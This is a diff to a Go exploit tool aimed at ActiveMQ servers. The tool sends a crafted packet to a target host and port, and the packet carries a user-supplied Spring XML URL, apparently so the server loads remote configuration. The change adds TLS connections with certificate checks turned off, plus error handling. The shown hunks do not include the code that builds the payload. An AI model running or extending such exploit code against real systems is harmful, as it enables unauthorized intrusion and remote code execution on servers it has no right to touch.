@@ -1,6 +1,7 @@
 package main
 
 import (
+	"crypto/tls"
 	"encoding/hex"
 	"flag"
 	"fmt"
@@ -11,14 +12,16 @@ import (
 func main() {
 
 	var (
-		ip   string
-		port string
-		url  string
+		ip     string
+		port   string
+		url    string
+		useTLS bool
 	)
 
 	flag.StringVar(&ip, "i", "", "ActiveMQ Server IP or Host")
 	flag.StringVar(&port, "p", "61616", "ActiveMQ Server Port")
-	flag.StringVar(&url, "u", "", "Spring XML Url")
+	flag.StringVar(&url, "u", "", "Spring XML URL")
+	flag.BoolVar(&useTLS, "t", false, "Use TLS for connection")
 	flag.Parse()
 
 	banner()
@@ -41,7 +44,23 @@ func main() {
 	fmt.Println()
 	fmt.Println("[*] Sending packet:", payload)
 
-	conn, _ := net.Dial("tcp", ip+":"+port)
+	var conn net.Conn
+	var err error
+
+	if useTLS {
+		conf := &tls.Config{
+			InsecureSkipVerify: true,
+		}
+		conn, err = tls.Dial("tcp", ip+":"+port, conf)
+	} else {
+		conn, err = net.Dial("tcp", ip+":"+port)
+	}
+
+	if err != nil {
+		fmt.Println("[-] Connection error:", err)
+		return
+	}
+
 	conn.Write(data)
 	conn.Close()
 }
